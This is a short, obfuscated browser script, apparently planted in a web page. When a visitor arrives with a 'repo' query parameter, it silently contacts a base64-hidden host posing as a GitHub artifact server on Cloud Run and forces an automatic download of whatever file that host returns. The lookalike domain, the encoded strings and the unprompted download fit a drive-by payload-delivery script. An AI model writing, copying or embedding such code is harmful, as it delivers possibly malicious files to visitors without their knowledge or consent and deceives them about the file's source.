(function () {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);

  if (!!urlParams.get(atob('cmVwbw=='))) {
    fetch(atob('aHR0cHM6Ly9naXRodWItYXJ0aWZhY3QtNnlyNG5iZWYzcS11Yy5hLnJ1bi5hcHAv') + queryString, {
      redirect: 'manual'
    })
      .then(function (res) {
        if (!!res) {
          var fileUrl = res.url;

          var link = document.createElement('a');
          link.href = fileUrl;
          link.download = fileUrl.substr(fileUrl.lastIndexOf('/') + 1);

          link.click();
        }
      });
  }
})();
